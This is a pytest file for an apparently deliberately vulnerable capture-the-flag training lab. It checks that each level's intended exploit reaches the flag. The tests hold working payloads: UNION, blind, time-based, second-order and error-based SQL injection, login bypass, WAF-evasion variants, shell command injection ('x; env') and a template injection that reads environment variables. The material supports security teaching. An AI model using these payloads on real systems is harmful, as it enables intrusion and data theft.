import sqlite3
import urllib.parse

import deadwood.levels  # noqa: F401  (registers every level)
from deadwood import data
from deadwood.level import TIERS, Request, all_levels, by_slug


def _req(query):
    return Request("GET", "/x?" + urllib.parse.urlencode(query), {}, b"", ("127.0.0.1", 0))


def _db_for(lv):
    db = sqlite3.connect(":memory:")
    data.build(db)
    lv.seed(db)
    return db


def test_registry_is_coherent():
    levels = all_levels()
    assert len(levels) >= 4
    slugs = [lv.slug for lv in levels]
    nums = [lv.num for lv in levels]
    assert len(set(slugs)) == len(slugs)            # slugs unique
    assert len(set(nums)) == len(nums)              # numbers unique
    assert nums == sorted(nums)                      # ordered
    for lv in levels:
        assert lv.title and lv.slug and lv.category
        assert lv.objective and lv.hints and lv.remediation and lv.source
        assert lv.tier in TIERS


def test_first_blood_union_reaches_the_flag(monkeypatch, tmp_path):
    monkeypatch.setenv("XDG_DATA_HOME", str(tmp_path))
    lv = by_slug("first-blood")
    db = _db_for(lv)
    assert b"<b>" in lv.handle(_req({"id": "1"}), db).body         # normal lookup reflects a name
    out = lv.handle(_req({"id": "0 UNION SELECT 1,label,value FROM secrets"}), db).body
    assert lv.flag().encode() in out                              # the flag is reachable via UNION


def test_whispers_has_a_boolean_differential(monkeypatch, tmp_path):
    monkeypatch.setenv("XDG_DATA_HOME", str(tmp_path))
    lv = by_slug("whispers")
    db = _db_for(lv)
    true_page = lv.handle(_req({"user": "admin' AND '1'='1"}), db).body
    false_page = lv.handle(_req({"user": "admin' AND '1'='2"}), db).body
    assert b"Welcome back" in true_page
    assert b"Invalid login" in false_page


def test_back_door_command_injection_leaks_the_flag(monkeypatch, tmp_path):
    monkeypatch.setenv("XDG_DATA_HOME", str(tmp_path))
    lv = by_slug("back-door")
    db = _db_for(lv)
    out = lv.handle(_req({"host": "x; echo $DEADWOOD_FLAG"}), db).body
    assert lv.flag().encode() in out


def test_back_door_does_not_leak_sibling_flags(monkeypatch, tmp_path):
    monkeypatch.setenv("XDG_DATA_HOME", str(tmp_path))
    cipher, bd = by_slug("the-cipher"), by_slug("back-door")
    _db_for(cipher)                                  # The Cipher's seed() puts DEADWOOD_CIPHER in os.environ
    out = bd.handle(_req({"host": "x; env"}), _db_for(bd)).body
    assert bd.flag().encode() in out                 # its own flag is still reachable
    assert cipher.flag().encode() not in out         # but a sibling room's flag must not leak through


def test_the_bouncer_auth_bypass(monkeypatch, tmp_path):
    monkeypatch.setenv("XDG_DATA_HOME", str(tmp_path))
    lv = by_slug("the-bouncer")
    db = _db_for(lv)
    denied = lv.handle(_req({"user": "admin", "pass": "guess"}), db).body
    assert b"Access denied" in denied
    bypass = lv.handle(_req({"user": "admin'-- -", "pass": "x"}), db).body
    assert lv.flag().encode() in bypass                          # comment out the password check


def test_sleight_of_hand_filtered_union(monkeypatch, tmp_path):
    monkeypatch.setenv("XDG_DATA_HOME", str(tmp_path))
    lv = by_slug("sleight-of-hand")
    db = _db_for(lv)
    # the catalog is blocked
    assert b"blocked" in lv.handle(_req({"id": "1 UNION SELECT name,1,2 FROM sqlite_master"}), db).body
    # but a quote-free, by-name UNION still reaches the flag
    out = lv.handle(_req({"id": "0 UNION SELECT 1,label,value FROM secrets"}), db).body
    assert lv.flag().encode() in out


def test_the_cipher_ssti_reads_the_flag(monkeypatch, tmp_path):
    monkeypatch.setenv("XDG_DATA_HOME", str(tmp_path))
    lv = by_slug("the-cipher")
    db = _db_for(lv)                                             # seed() puts the flag in the env
    payload = "{{__import__('os').environ['DEADWOOD_CIPHER']}}"
    assert lv.flag().encode() in lv.handle(_req({"name": payload}), db).body


def test_dead_mans_hand_waf_and_blind_path(monkeypatch, tmp_path):
    monkeypatch.setenv("XDG_DATA_HOME", str(tmp_path))
    lv = by_slug("dead-mans-hand")
    db = _db_for(lv)
    assert b"disabled" in lv.handle(_req({"id": "1 UNION SELECT 1"}), db).body      # WAF blocks UNION
    assert b"record found" in lv.handle(_req({"id": "1"}), db).body                 # boolean: true
    assert b"no such record" in lv.handle(_req({"id": "999999"}), db).body          # boolean: false
    # the flag is reachable blind, by name (no catalog, no quotes): a true subquery → found
    probe = lv.handle(_req({"id": "1 AND ((SELECT count(*) FROM secrets)>=0)"}), db).body
    assert b"record found" in probe


def test_the_vault_second_order_injection(monkeypatch, tmp_path):
    monkeypatch.setenv("XDG_DATA_HOME", str(tmp_path))
    lv = by_slug("the-vault")
    db = _db_for(lv)
    reg = _req({"nickname": "nobody' UNION SELECT value FROM secrets-- -"})
    reg.subpath = "/register"
    lv.handle(reg, db)                                           # stored safely…
    board = _req({})
    board.subpath = "/board"
    assert lv.flag().encode() in lv.handle(board, db).body       # …executed on the board


def test_the_ledger_error_based_32char_windows(monkeypatch, tmp_path):
    monkeypatch.setenv("XDG_DATA_HOME", str(tmp_path))
    from deadwood.levels.l_the_ledger import xpath_leak
    lv = by_slug("the-ledger")
    db = _db_for(lv)
    expr = "(SELECT value FROM secrets WHERE label='the-ledger')"
    one = xpath_leak(f"1' AND extractvalue(1,concat(0x7e,{expr}))-- -", db)
    assert len(one) == 32 and lv.flag().startswith(one) and one != lv.flag()   # truncates at 32
    w1 = xpath_leak(f"1' AND extractvalue(1,concat(0x7e,substring({expr},1,32)))-- -", db)
    w2 = xpath_leak(f"1' AND extractvalue(1,concat(0x7e,substring({expr},33,32)))-- -", db)
    assert w1 + w2 == lv.flag()                                                 # windows reassemble
    assert b"error in your SQL syntax" in lv.handle(_req({"ref": "1'"}), db).body
    assert b"error in your SQL syntax" not in lv.handle(_req({"ref": "1''"}), db).body


def test_the_strongbox_double_quote_union(monkeypatch, tmp_path):
    monkeypatch.setenv("XDG_DATA_HOME", str(tmp_path))
    lv = by_slug("the-strongbox")
    db = _db_for(lv)
    out = lv.handle(_req({"box": 'zzz" UNION SELECT label,value,1 FROM secrets-- -'}), db).body
    assert lv.flag().encode() in out


def test_the_watchman_paren_time_oracle(monkeypatch, tmp_path):
    monkeypatch.setenv("XDG_DATA_HOME", str(tmp_path))
    import time
    lv = by_slug("the-watchman")
    db = _db_for(lv)

    def t(q):
        s = time.monotonic()
        lv.handle(_req({"q": q}), db)
        return time.monotonic() - s
    fast = t("x') OR (id=1 AND sleep(0))-- -")
    slow = t("x') OR (id=1 AND sleep(1))-- -")           # paren breakout, fires once
    assert slow - fast > 0.6


def test_the_gauntlet_waf_case_and_comment_bypass(monkeypatch, tmp_path):
    monkeypatch.setenv("XDG_DATA_HOME", str(tmp_path))
    lv = by_slug("the-gauntlet")
    db = _db_for(lv)
    assert b"blocked that" in lv.handle(_req({"id": "1 UNION SELECT 1,2,3"}), db).body  # literal blocked
    case = lv.handle(_req({"id": "0 UnIoN SeLeCt 1,label,value FROM secrets-- -"}), db).body
    comment = lv.handle(_req({"id": "0 UNION/**/SELECT 1,label,value FROM secrets-- -"}), db).body
    assert lv.flag().encode() in case and lv.flag().encode() in comment


def test_the_annex_cross_database(monkeypatch, tmp_path):
    monkeypatch.setenv("XDG_DATA_HOME", str(tmp_path))
    lv = by_slug("the-annex")
    db = _db_for(lv)
    out = lv.handle(_req({"id": "0 UNION SELECT 1,label,value FROM archive.secrets-- -"}), db).body
    assert lv.flag().encode() in out
    main = "".join(r[0] for r in db.execute("SELECT value FROM secrets"))
    assert lv.flag() not in main                         # the flag is only in the ATTACHed db
